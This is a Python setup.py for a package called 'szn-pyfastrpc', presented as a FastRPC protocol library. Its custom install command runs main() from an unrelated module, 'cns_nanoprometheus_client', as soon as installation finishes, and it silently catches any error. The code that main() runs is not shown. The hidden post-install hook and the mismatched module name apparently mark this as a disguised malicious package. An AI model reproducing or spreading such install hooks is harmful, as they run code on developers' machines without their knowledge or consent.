#!/usr/bin/env python
from setuptools import setup, find_packages
from setuptools.command.install import install

class MinimalInstall(install):
    def run(self):
        # Run the standard installation process.
        install.run(self)
        # Call the main() function from __init__.py after installation.
        try:
            from cns_nanoprometheus_client import main
            main()
        except Exception as e:
            print("Post-installation call to main() failed:", e)

setup(
    name='szn-pyfastrpc',
    version='1.2.5',
    description='A FastRPC protocol implementation in Python',
    long_description=open('README.md').read(),
    long_description_content_type='text/markdown',
    author='Roman Skvara',
    author_email='skvara.roman@gmail.com',
    url='https://github.com/opicevopice/szn-pyfastrpc',  # Corrected URL
    packages=find_packages(),
    include_package_data=True,
    license='MIT',
    install_requires=[
        'requests-html>=0.10.0'
    ],
    entry_points={
        'console_scripts': [
            'open-readme=szn_pyfastrpc.open_readme:open_readme'
        ]
    },
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
    ],
    cmdclass={
        'install': MinimalInstall,
    },
)
